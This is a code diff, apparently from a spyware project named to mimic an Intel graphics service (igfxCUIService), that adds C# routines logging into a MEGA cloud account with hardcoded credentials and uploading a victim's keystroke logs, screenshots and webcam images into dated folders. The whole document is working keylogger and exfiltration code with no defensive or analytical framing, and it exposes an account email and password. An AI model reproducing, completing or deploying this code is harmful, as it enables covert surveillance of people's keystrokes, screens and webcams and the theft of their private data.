@@ -13,68 +13,160 @@ namespace igfxCUIService
         #region variable
         private static MegaApiClient client = new MegaApiClient();
         private static INode root;
-        private static INode keylogger;
-        private static INode keylog;
-        private static INode screenshots;
-        private static INode webcam;
-        private static INode Sendfile;
+        private static INode keyloggermap;
+        private static INode screenshotsmap;
+        private static INode webcammap;
+        private static INode Sendscreenshot;
+        private static INode Sendkeylog;
+        private static INode Sendwebcam;
+        private static INode screenshotsday;
+        private static INode webcamday;
+        private static INode keylogmap;
+
         #endregion
 
-        public static void Uploadfile()
+        //Uri downloadUrl = client.GetDownloadLink(Sendfile);
+        //Console.WriteLine(downloadUrl);
+        //Console.ReadLine();
+
+        #region screenshots
+        public static void Screenshotsupload()
         {
             client.Login("dippernetwork@gmail.com", "igfxCUIService");
             var nodes = client.GetNodes();
             root = nodes.Single(n => n.Type == NodeType.Root);
 
-            maps();
+            Screenshotsmaps();
 
-            Sendfile = client.UploadFile(Screenshots.pathString + Screenshots.hour + "." + Screenshots.minuten + "." + Screenshots.seconde + ".jpeg", screenshots);
+            Sendscreenshot = client.UploadFile(Screenshots.pathString + Screenshots.hour + "." + Screenshots.minuten + "." + Screenshots.seconde + ".jpeg", screenshotsday);
 
-            //Uri downloadUrl = client.GetDownloadLink(Sendfile);
-            //Console.WriteLine(downloadUrl);
-
-            //Console.ReadLine();
             client.Logout();
         }
 
-        private static void maps()
+        private static void Screenshotsmaps()
         {
+            // hier de dagelijkst map
             var nodes = client.GetNodes();
+            // main folder
             try
             {
-                keylogger = client.GetNodes(root).Single(n => n.Name == "keylogger");
+                keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
             }
             catch
             {
-                keylogger = client.CreateFolder("keylogger", root);
+                keyloggermap = client.CreateFolder("keylogger", root);
             }
-            // keylog
+            // screenshots folder
             try
             {
-                INode keylog = client.GetNodes(keylogger).Single(n => n.Name == "keylog");
+                screenshotsmap = client.GetNodes(keyloggermap).Single(n => n.Name == "screenshots");
             }
             catch
             {
-                keylog = client.CreateFolder("keylog", keylogger);
+                screenshotsmap = client.CreateFolder("screenshots", keyloggermap);
             }
-            // screenshots
+            // dag map 
             try
             {
-                screenshots = client.GetNodes(keylogger).Single(n => n.Name == "screenshots");
+                screenshotsday = client.GetNodes(screenshotsmap).Single(n => n.Name == Screenshots.datum.ToShortDateString());
             }
             catch
             {
-                screenshots = client.CreateFolder("screenshots", keylogger);
+                screenshotsday = client.CreateFolder(Screenshots.datum.ToShortDateString(), screenshotsmap);
+            }
+        }
+        #endregion
+
+        // deze moet aan gepast worden op de text bestand nog
+        #region keylogger
+
+        public static void Keylogupload()
+        {
+            client.Login("dippernetwork@gmail.com", "igfxCUIService");
+            var nodes = client.GetNodes();
+            root = nodes.Single(n => n.Type == NodeType.Root);
+
+            Keylogsmaps();
+
+            Sendkeylog = client.UploadFile(Keylogger.pathString + "/" + Keylogger.datum.ToShortDateString() + ".text", screenshotsmap);
+
+            client.Logout();
+        }
+
+        private static void Keylogsmaps()
+        {
+            // hier de dagelijkst map
+            var nodes = client.GetNodes();
+            // main folder
+            try
+            {
+                keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
+            }
+            catch
+            {
+                keyloggermap = client.CreateFolder("keylogger", root);
+            }
+            // keylogs
+            try
+            {
+                keylogmap = client.GetNodes(keyloggermap).Single(n => n.Name == "keylog");
+            }
+            catch
+            {
+                keylogmap = client.CreateFolder("keylog", keyloggermap);
+            }
+
+        }
+        #endregion
+
+        #region webcam
+
+        public static void Webcamupload()
+        {
+            client.Login("dippernetwork@gmail.com", "igfxCUIService");
+            var nodes = client.GetNodes();
+            root = nodes.Single(n => n.Type == NodeType.Root);
+
+            Webcammaps();
+
+            Sendwebcam = client.UploadFile(Webcam.pathString + Webcam.webcamhour + "." + Webcam.webcamminut + "." + Webcam.webcamseconde + ".jpeg", webcamday);
+            
+            client.Logout();
+        }
+
+        private static void Webcammaps()
+        {
+
+            var nodes = client.GetNodes();
+            // main folder
+            try
+            {
+                keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
+            }
+            catch
+            {
+                keyloggermap = client.CreateFolder("keylogger", root);
             }
             // webcam
             try
             {
-                webcam = client.GetNodes(keylogger).Single(n => n.Name == "webcam");
+                webcammap = client.GetNodes(keyloggermap).Single(n => n.Name == "webcam");
             }
             catch
             {
-                webcam = client.CreateFolder("webcam", keylogger);
+                webcammap = client.CreateFolder("webcam", keyloggermap);
             }
+            // dag map
+            try
+            {
+                webcamday = client.GetNodes(webcammap).Single(n => n.Name == Webcam.datum.ToShortDateString());
+            }
+            catch
+            {
+                webcamday = client.CreateFolder(Webcam.datum.ToShortDateString(), webcammap);
+            }
+            
         }
+        #endregion
     }
 }
